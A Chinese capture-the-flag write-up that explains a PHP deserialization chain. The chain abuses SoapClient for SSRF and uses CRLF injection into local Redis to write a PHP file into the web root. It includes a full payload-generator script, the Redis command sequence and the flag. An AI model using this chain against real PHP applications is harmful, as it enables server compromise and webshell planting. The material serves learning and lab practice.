# 这真的是反序列化

## 题目简述

入口对 `ai` 参数直接执行 PHP `unserialize()`。反序列化得到的 `pure` 对象在析构时可动态实例化任意类，并调用一个不存在的方法；将类名设为内置 `SoapClient` 后，可以借其 `__call()` 发起到本机 Redis 的请求，再通过 SOAP 头部中的 CRLF 注入发送 Redis 命令，最终把可执行 PHP 写入 Web 根目录。

## 解题过程

`pure` 类的析构链只有两步：

```php
public function __destruct() {
    $this->reverse();
    $this->osint();
}

public function reverse() {
    $this->pwn = new $this->web($this->misc, $this->crypto);
}

public function osint() {
    $this->pwn->play_0xGame();
}
```

令 `$web = 'SoapClient'`、`$misc = null`，就会创建非 WSDL 模式的 `SoapClient`；第二个参数需要提供 `location` 和 `uri`。随后调用不存在的 `play_0xGame()`，触发 `SoapClient::__call()` 并向 `location` 发送 SOAP 请求。

原 PDF 给出的延伸资料包括 [SoapClient 利用参考](https://blog.csdn.net/qq_42181428/article/details/100569464)、[SOAP 导致的 SSRF](https://xz.aliyun.com/news/2640) 和 [PHP 官方 SoapClient 手册](https://www.php.net/manual/en/class.soapclient.php)。本题依赖的非 WSDL 构造参数、`__call()` 发起请求以及可控请求头条件均已在下文展开，复现主线不依赖这些页面继续可访问。

仓库部署文件补全了利用条件：Redis 版本为 3.2.1，只监听 `127.0.0.1:6379`，密码为 `20251206`，关闭了 protected mode；`/var/www/html` 可写，flag 则通过环境变量 `Flag` 注入。题目提示 `Redis20251206` 中的数字正是认证密码。

`uri` 会进入 SOAP 请求头。插入 `\r\n` 可以提前结束该头部，并把后续各行解释为 Redis inline protocol 命令。下面直接写入一个读取环境变量的 PHP 文件，不依赖外部管理工具：

```php
<?php
class pure {
    public $web;
    public $misc;
    public $crypto;
    public $pwn;
}

$redis =
    "AUTH 20251206\r\n" .
    "CONFIG SET dir /var/www/html/\r\n" .
    "CONFIG SET dbfilename shell.php\r\n" .
    "SET x '<?php echo getenv(\"Flag\"); ?>'\r\n" .
    "SAVE";

$obj = new pure();
$obj->web = 'SoapClient';
$obj->misc = null;
$obj->crypto = [
    'location' => 'http://127.0.0.1:6379/',
    'uri' => "hello\"\r\n" . $redis . "\r\nhello",
];

echo urlencode(serialize($obj));
```

把生成结果作为 `/?ai=<payload>` 发送。析构触发后，命令链依次完成认证、修改 Redis 快照目录和文件名、写入带 PHP 标记的数据，再用 `SAVE` 生成 `/var/www/html/shell.php`。RDB 文件会包含二进制元数据，但 PHP 仍会执行其中的 `<?php ... ?>` 片段。

最后访问 `/shell.php`，可读到：

```text
0xGame{SoapClient_SSRF_Attack_Redis}
```

## 方法总结

- 本题的 POP 链不长，关键是动态类实例化和对不存在方法的调用共同落到 `SoapClient::__call()`。
- `SoapClient` 的非 WSDL 模式允许控制目标地址与命名空间；当命名空间进入 HTTP 头部时，CRLF 可把请求转换成面向内网文本协议的命令流。
- SSRF 能否进一步利用取决于部署条件。本题仓库明确给出了 Redis 版本、密码、监听地址、可写 Web 根目录和 flag 环境变量，完整闭合了攻击链。
